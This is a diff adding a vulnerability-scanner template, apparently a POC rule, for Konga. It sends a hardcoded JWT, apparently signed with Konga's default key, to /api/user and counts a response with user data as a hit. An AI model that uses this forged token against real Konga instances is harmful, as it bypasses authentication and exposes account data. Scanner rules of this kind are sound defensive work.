@@ -1,0 +1,19 @@
+name: Konga Default JWT KEY
+manual: true
+query: title="Konga" || body="window.konga_version"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/user
+      headers:
+        authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.MQ.gSssTBEVe6X9aFEd0H_tt8kk2u7df90W1eOzNRnrsQ4
+    expression: response.status == 200 && response.body.bcontains(b"createdUser")
+      && response.body.bcontains(b"username")
+expression: r0()
+detail:
+  links:
+  - https://mp.weixin.qq.com/s/8guU2hT3wE2puEztdGqZQg
+  description: Konga offers the tools you need to manage your Kong cluster with ease.
+  tags: defaultaccount
